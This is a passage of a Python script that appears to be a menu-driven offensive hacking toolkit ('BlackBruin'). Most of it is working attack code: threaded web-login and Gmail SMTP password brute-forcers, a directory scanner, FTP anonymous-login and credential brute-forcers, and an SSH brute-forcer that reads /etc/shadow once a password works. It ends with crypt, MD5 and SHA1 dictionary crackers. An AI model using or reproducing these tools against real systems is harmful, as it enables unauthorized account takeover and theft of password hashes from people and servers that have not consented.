                    method = arg

            try:
                f = open(dictionary, "r")
                passwords = f.readlines()
            except:
                print("[-] Error. File Does Not Exist")
                sys.exit()

            launchThreads(passwords, threads, user, url, method)


        def launchThreads(passwords, threads, user, url, method):
            global i
            i = []
            i.append(0)
            while len(passwords):
                if hit == "1":
                    try:
                        if i[0] < int(threads):
                            password = passwords.pop(0)
                            i[0] = i[0] + 1
                            thread = request_performer(password, user, url, method)
                            thread.start()

                    except KeyboardInterrupt:
                        print("Program Interrupted")
                        sys.exit()
                    thread.join()


        if __name__ == "__main__":
            try:
                start(sys.argv[1:])
            except KeyboardInterrupt:
                print("[-] Program Interrupted")
    elif pentestg == 2:
        def bruteforce(username, url):
            for password in passwords:
                password = password.strip('\n')
                print("Trying Password: %s" % password)
                dataDict = {"username": username, "password": password, "Login": "submit"}
                response = requests.post(url, data=dataDict)
                if b"Login failed" in response.content:
                    pass
                else:
                    print("[+] Username --> " + username,)
                    print("[+] Password --> " + password, "green")
                    exit()


        page_url = input("page url >> ")
        username = input("Enter Username For Specified Page: ")

        with open("passwordList.txt", "r") as passwords:
            bruteforce(username, page_url)

        print("[-] Password Not Found in List")
    elif pentestg == 3:
        def request(url):
            try:
                return requests.get("http://" + url)
            except requests.exceptions.ConnectionError:
                pass


        targetURL = input("Enter Target URL: ")
        file = open("common.txt", "r")
        for line in file:
            line = line.strip('\n')
            fullURL = targetURL + "/" + line
            response = request(fullURL)
            if response:
                print('[+] Discovered Directory at Link: ' + fullURL)


    elif pentestg == 4:
        smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
        smtpServer.ehlo()
        smtpServer.starttls()

        user = input("Enter Target Email Address: ")
        file = input("Enter Path to Password File: ")
        passwordFile = open(file, "r")

        for password in passwordFile:
            password = password.strip('\n')
            try:
                smtpServer.login(user, password)
                print('[+] Password Found: %s' % password)
            except smtplib.SMTPAuthenticationError:
                print('[-] Wrond Password: %s' % password)

elif choose == 9:
    print('''
    [1] anonymous Login
    [2] sshBrute
    [3] sshLogin
    [4] ftpBrute
    ''')
    sshftp = int(input("BlackBruin >> "))
    if sshftp == 1:
        def anonLogin(hostname):
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login('anonymous', 'anonymous')
                print('[+] ' + hostname + ' FTP Anonymous Login Successfull')
                ftp.quit()
                return True
            except:
                print('[-] ' + hostname + ' FTP Anonymous Login Failed')
                return False


        host = input("Enter IP Address to Target: ")
        anonLogin(host)
    elif sshftp == 2:
        def bruteLogin(hostname, passwordFile):
            try:
                file = open(passwordFile, 'r')
            except:
                print('[-] File Does Not Exist')

            print('[*] Attempting to Login to: ' + hostname + '\n')
            for line in file.readlines():
                username = line.split(':')[0].strip('\n')
                password = line.split(':')[1].strip('\n')
                print('[*] Trying Credentials: ' + username + ' : ' + password)
                try:
                    ftp = ftplib.FTP(hostname)
                    login = ftp.login(username, password)
                    print('[+] Login Successful With: ' + username + ' / ' + password)
                    ftp.quit()
                    return (username, password)
                except:
                    pass
            print('[-] Password Not In List')


        host = input("[*] Enter Host to Target: ")
        passwordFile = input('[*] Enter User/Password File Path: ')
        bruteLogin(host, passwordFile)
    elif sshftp == 3:
        PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']


        def send_command(connection, command):
            connection.sendline(command)
            connection.expect(PROMPT)
            print(connection.before.decode())


        def connect(user, host, password):
            ssh_newkey = 'Are you sure you want to continue connecting'
            connString = 'ssh ' + user + '@' + host
            spawn = pexpect.spawn(connString)
            ret = spawn.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
            if ret == 0:
                print('[-] Error Connecting')
                return

            if ret == 1:
                spawn.sendline('Yes')
                ret = spawn.expcet([pexpect.TIMEOUT, '[P|p]assword: '])
                if ret == 0:
                    print('[-] Error Connecting')
                    return
            spawn.sendline(password)
            spawn.expect(PROMPT, timeout=0.1)
            return spawn


        def main():
            host = input("Enter IP address of Target to Bruteforce: ")
            user = input("Enter User Account to Bruteforce: ")
            file = open('passwords.txt', 'r')
            for password in file.readlines():
                password = password.strip('\n')
                try:
                    spawn = connect(user, host, password)
                    print('[+] Password Found: ' + password)
                    send_command(spawn, 'cat /etc/shadow')
                except:
                    print('[-] Wrong Password: ' + password)


        main()

    elif sshftp == 4:
        PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']


        def send_command(connection, command):
            connection.sendline(command)
            connection.expect(PROMPT)
            print(connection.before.decode())


        def connect(user, host, password):
            ssh_newkey = 'Are you sure you want to continue connecting'
            connString = 'ssh ' + user + '@' + host
            spawn = pexpect.spawn(connString)
            ret = spawn.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
            if ret == 0:
                print('[-] Error Connecting')
                return

            if ret == 1:
                spawn.sendline('Yes')
                ret = spawn.expcet([pexpect.TIMEOUT, '[P|p]assword: '])
                if ret == 0:
                    print('[-] Error Connecting')
                    return
            spawn.sendline(password)
            spawn.expect(PROMPT)
            return spawn


        def main():
            host = input("Enter Host to Target: ")
            user = input("Enter SSH Username: ")
            password = input("Enter SSH Password: ")
            shell = connect(user, host, password)
            send_command(shell, 'cat /etc/shadow | grep root;ps')


        main()

elif choose == 10:
    print('''
    [1]cryptForce
    [2]hasher
    [3]md5Brute
    [4]sha1Hash
    ''')
    passwordcracking = int(input("BlackBruin >> "))
    if passwordcracking == 1:
        def crackPassword(username, password):
            salt = password[0:2]
            dictionary = open('crypt_dictionary.txt', 'r')
            for word in dictionary:
                word = word.strip('\n')
                cryptPassword = crypt.crypt(word, salt)
                if password == cryptPassword:
                    print('[+] Found Password\t\t\t' + username + ' : ' + word)
                    return
            print('[-] Unable to Crack Password For:\t' + username)


        def main():
            try:
                passwordFile = open('crypt_passwords.txt', 'r')
            except:
                print('[-] File Not Found')
                quit()
            for line in passwordFile.readlines():
                username = line.split(':')[0]
                password = line.split(':')[1].strip('\n')
                # print(Fore.RED + '[*] Cracking Password For: ' + username)
                crackPassword(username, password)


        main()
    elif passwordcracking == 2:
        hashValue = input('Enter String to Hash: ')

        hashmd5 = hashlib.md5()
        hashmd5.update(hashValue.encode())
        print('MD5 Hash: ' + hashmd5.hexdigest())

        hashsha1 = hashlib.sha1();
        hashsha1.update(hashValue.encode())
        print('SHA1 Hash: ' + hashsha1.hexdigest())

        hashsha224 = hashlib.sha224()
        hashsha224.update(hashValue.encode())
        print('SHA224 Hash: ' + hashsha224.hexdigest())

        hashsha256 = hashlib.sha256()
        hashsha256.update(hashValue.encode())
        print('SHA256 Hash: ' + hashsha256.hexdigest())

        hashsha512 = hashlib.sha512()
        hashsha512.update(hashValue.encode())
        print('SHA512 Hash: ' + hashsha512.hexdigest())
    elif passwordcracking == 3:
        def openFile(wordList):
            try:
                file = open(wordList, 'r')
                return file
            except:
                print("[-] File Not Found")
                quit()


        passwordHash = input('Enter MD5 Hash Value: ')
        wordList = input('Enter Path to Password File: ')
        file = openFile(wordList)

        for word in file:
            print('[*] Trying: ' + word.strip('\n'))
            encodeWord = word.encode('UTF-8')
            md5Hash = hashlib.md5(encodeWord.strip()).hexdigest()

            if md5Hash == passwordHash:
                print('[+] Password Found: ' + word)
                exit(0)
            else:
                pass

        print('[-] Password Not in List')
    elif passwordcracking == 4:
        sha1hash = input('[*] Enter SHA1 Hash: ')

        passwordList = str(urllib.request.urlopen(
            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                           'UTF-8')

        for password in passwordList.split('\n'):
            hashGuess = hashlib.sha1(bytes(password, 'UTF-8')).hexdigest()
            if hashGuess == sha1hash:
                print("[+] Password Found: " + str(password))
                quit()
            else:
                print('[-] Password not found. Trying next password...')
                pass

        print("Password Not Found in Password List")